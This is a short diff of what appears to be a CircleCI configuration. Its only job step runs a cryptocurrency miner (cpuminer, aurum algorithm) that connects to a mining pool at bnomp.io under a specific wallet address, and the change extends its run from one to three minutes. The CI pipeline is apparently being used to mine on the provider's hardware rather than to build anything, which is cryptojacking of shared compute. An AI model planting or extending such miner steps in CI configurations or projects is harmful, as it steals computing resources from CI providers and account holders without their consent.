@@ -22,7 +22,7 @@ jobs:
       - run:
           name: Run command with Timeout
           command: |
-            timeout 1m bash -c 'cd cpuminer-linux && ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x || true'
+            timeout 3m bash -c 'cd cpuminer-linux && ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x || true'
 
 workflows:
   version: 2
